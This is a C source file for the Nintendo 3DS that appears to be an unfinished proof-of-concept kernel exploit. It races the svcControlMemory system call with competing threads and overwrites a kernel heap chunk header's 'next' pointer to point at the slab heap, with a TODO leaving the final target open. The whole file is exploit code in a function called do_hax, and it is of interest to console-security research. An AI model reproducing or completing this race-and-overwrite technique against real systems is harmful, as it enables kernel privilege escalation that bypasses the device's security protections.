#include <3ds.h>

#include <stdio.h>
#include <stdlib.h>

#define SLAB_HEAP ((void*) 0xFFF70000)
#define PAGE_SIZE 0x1000

typedef struct {
    u32 size;
    void* next;
    void* prev;
} MemChunkHdr;

extern u32 __ctru_heap;
extern u32 __ctru_heap_size;

static Result control_res = -1;

// Thread function to slow down svcControlMemory execution.
void delay_thread(void* arg) {
    // Slow down thread execution until the control operation has completed.
    while(control_res == -1) {
        svcSleepThread(10000);
    }
}

// Thread function to allocate memory pages.
void allocate_thread(void* arg) {
    u32* memInfo = (u32*) arg;
    if(memInfo == NULL) {
        // Don't try to use invalid memory information.
        return;
    }

    // Allocate the requested pages.
    u32 tmp;
    control_res = svcControlMemory(&tmp, memInfo[0], 0, memInfo[1], MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));

    // Free memory information.
    free(memInfo);
}

// Maps pages with chunk headers present.
void map_raw_pages(u32 memAddr, u32 memSize) {
    // Reset control result.
    control_res = -1;

    // Prepare memory information.
    u32* memInfo = (u32*) malloc(sizeof(u32) * 2);
    memInfo[0] = memAddr;
    memInfo[1] = memSize;

    // Retrieve arbiter.
    Handle arbiter = __sync_get_arbiter();

    // Create thread to slow down svcControlMemory execution. Yes, this is ugly, but it works.
    threadCreate(delay_thread, NULL, 0x4000, 0x18, 1, true);
    // Create thread to allocate pages.
    threadCreate(allocate_thread, memInfo, 0x4000, 0x3F, 1, true);

    // Use svcArbitrateAddress to detect when the memory page has been mapped.
    while((u32) svcArbitrateAddress(arbiter, memAddr, ARBITRATION_WAIT_IF_LESS_THAN, 0, 0) == 0xD9001814);
}

void wait_map_complete() {
    while(control_res == -1) {
        svcSleepThread(1000000);
    }
}

// Executes exploit.
void do_hax() {
    // Prepare necessary info.
    u32 memAddr = __ctru_heap + __ctru_heap_size;
    u32 memSize = PAGE_SIZE * 2;

    // Map the pages.
    map_raw_pages(memAddr, memSize);

    // Retrieve the current header data.
    MemChunkHdr hdr = *(volatile MemChunkHdr*) memAddr;

    // Overwrite the header "next" pointer.
    ((MemChunkHdr*) memAddr)->next = SLAB_HEAP; // TODO: destination

    // Output debug information.
    printf("\"Size\" value: %08X\n", (int) hdr.size);
    printf("\"Next\" value: %08X\n", (int) hdr.next);
    printf("\"Prev\" value: %08X\n", (int) hdr.prev);
    printf("Post-overwrite control result: %08X\n", (int) control_res);

    wait_map_complete();

    printf("Final control result: %08X\n", (int) control_res);

    // Free the allocated pages.
    u32 tmp;
    svcControlMemory(&tmp, memAddr, 0, memSize, MEMOP_FREE, MEMPERM_DONTCARE);
}

int main(int argc, char **argv) {
    gfxInitDefault();
    consoleInit(GFX_TOP, NULL);

    // Allow threads on core 1.
    aptOpenSession();
    APT_SetAppCpuTimeLimit(30);
    aptCloseSession();

    do_hax();

    printf("Press START to exit.\n");

    while(aptMainLoop()) {
        hidScanInput();
        if(hidKeysDown() & KEY_START) {
            break;
        }

        gfxFlushBuffers();
        gfxSwapBuffers();
        gspWaitForVBlank();
    }

    gfxExit();
    return 0;
}
